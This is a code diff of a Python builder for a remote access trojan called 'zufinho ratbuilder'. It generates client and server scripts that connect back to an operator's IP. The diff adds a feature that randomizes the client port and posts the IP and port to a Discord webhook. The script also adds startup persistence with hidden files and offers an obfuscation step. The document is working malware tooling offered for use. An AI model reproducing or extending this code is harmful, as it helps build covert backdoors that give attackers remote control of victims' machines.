@@ -6,17 +6,22 @@ if not os.name=="nt":
     time.sleep(3)
     exit()
 os.system("color 0a")
-os.system("title zufinho rat")
+os.system("title zufinho ratbuilder")
 name=input("RAT name:")
 ip=input("IP (you can use your radmin ip):")
-port=int(input("Port:"))
+randomizer=input("Randomize port and send to a discord webhook? (Y/N)")
+if randomizer=="y" or randomizer=="Y":
+    webhookurl=input("Webhook Url:")
+    port=0
+else:
+    port=int(input("Port:"))
 startup=input("Add rat to startup when starts? (Y/N)")
 exepy=input("EXE or PY?")
 if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
     noconsole=input("hide rat console? (Y/N)")
     obfuscated=input("Obfuscated? (Y/N)")
 
-def py(ip,port,name,noconsole,obf,startup):
+def py(ip,port,name,noconsole,obf,startup,randomizer):
     os.system("md temp")
     print("Building py...")
     os.system(r"copy src\client.py temp\client.py")
@@ -34,8 +39,23 @@ os.system(f'attrib +h "{destin_file}"')
 
 """
         client.write(startupcontent)
-    clientcontent=f"""
-rat = RAT_CLIENT('{ip}', {port})
+    if randomizer==True:
+        clientcontentr1=f"""
+portrandomizer=random.randint(1,9999)
+ip="{ip}"
+webhookurl='{webhookurl}'
+rat = RAT_CLIENT(ip, portrandomizer)
+"""
+        clientcontentr2="""
+ipandport=f"{ip}:{portrandomizer}"
+headers = {
+'Content-Type': 'application/json'
+}
+data = {
+'content': f"@here {ipandport}"
+}
+webhooksend = requests.post(webhookurl, headers=headers, json=data)
+print(webhooksend.status_code)
 if __name__ == '__main__':
     while True:
         try:
@@ -44,21 +64,38 @@ if __name__ == '__main__':
         except:
             print("trying reconnect")
 """
-    client.write(clientcontent)
+        client.write(clientcontentr1)
+        client.write(clientcontentr2)
+    else:
+        clientcontent=f"""
+rat = RAT_CLIENT("{ip}", {port})
+if __name__ == '__main__':
+    while True:
+        try:
+            rat.build_connection()
+            rat.execute()
+        except:
+            print("trying reconnect")
+"""
+        client.write(clientcontent)
     print("client created")
     client.close()
-    print("creating server...")
-    server=open(f"temp\server.py","a")
-    servercontent=f"""
-rat = RAT_SERVER('{ip}', {port})
+    if randomizer==True:
+        print("server not created")
+        print("randomizer port on")
+    else:
+        print("creating server...")
+        server=open(f"temp\server.py","a")
+        servercontent=f"""
+    rat = RAT_SERVER('{ip}', {port})
 
-if __name__ == '__main__':
-    rat.build_connection()
-    rat.execute()
-    """
-    server.write(servercontent)
-    server.close()
-    print("server created")
+    if __name__ == '__main__':
+        rat.build_connection()
+        rat.execute()
+        """
+        server.write(servercontent)
+        server.close()
+        print("server created")
     if obf==True:
         print("obfuscating...")
         os.system("src\obfuscator.pyw -o temp\clientobf.py temp\client.py")
@@ -82,7 +119,7 @@ if __name__ == '__main__':
     print("cleared")
     print("rat complete")
 
-def exe(ip,port,name,startup):
+def exe(ip,port,name,startup,randomizer):
     os.system("md temp")
     print("Building py...")
     os.system(r"copy src\client.py temp\client.py")
@@ -100,9 +137,23 @@ os.system(f"attrib {sourcepath} {startup_path} +H")
 
 """
         client.write(startupcontent)
-    clientcontent=f"""
-rat = RAT_CLIENT('{ip}', {port})
-
+    if randomizer==True:
+        clientcontentr1=f"""
+portrandomizer=random.randint(1,9999)
+ip="{ip}"
+webhookurl='{webhookurl}'
+rat = RAT_CLIENT(ip, portrandomizer)
+"""
+        clientcontentr2="""
+ipandport=f"{ip}:{portrandomizer}"
+headers = {
+'Content-Type': 'application/json'
+}
+data = {
+'content': f"@here {ipandport}"
+}
+webhooksend = requests.post(webhookurl, headers=headers, json=data)
+print(webhooksend.status_code)
 if __name__ == '__main__':
     while True:
         try:
@@ -110,8 +161,21 @@ if __name__ == '__main__':
             rat.execute()
         except:
             print("trying reconnect")
-    """
-    client.write(clientcontent)
+"""
+        client.write(clientcontentr1)
+        client.write(clientcontentr2)
+    else:
+        clientcontent=f"""
+rat = RAT_CLIENT("{ip}", {port})
+if __name__ == '__main__':
+    while True:
+        try:
+            rat.build_connection()
+            rat.execute()
+        except:
+            print("trying reconnect")
+"""
+        client.write(clientcontent)
     print("client created")
     client.close()
     print("creating server...")
@@ -153,11 +217,19 @@ if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
         starts=True
     else:
         starts=False
-    py(ip=ip,name=name,port=port,noconsole=nocons,obf=obfus,startup=starts)
+    if randomizer=="Y" or randomizer=="y":
+        randoms=True
+    else:
+        randoms=False
+    py(ip=ip,name=name,port=port,noconsole=nocons,obf=obfus,startup=starts,randomizer=randoms)
 if exepy=="exe" or exepy=="Exe" or exepy=="eXe" or exepy=="exE" or exepy=="EXe" or exepy=="eXE" or exepy=="EXE":
     if startup=="Y" or startup=="y":
         starts=True
     else:
         starts=False
-    exe(ip=ip,port=port,name=name,startup=starts)
+    if randomizer=="y" or randomizer=="Y":
+        randoms=True
+    else:
+        randoms=False
+    exe(ip=ip,port=port,name=name,startup=starts,randomizer=randoms)
 os.system("pause")
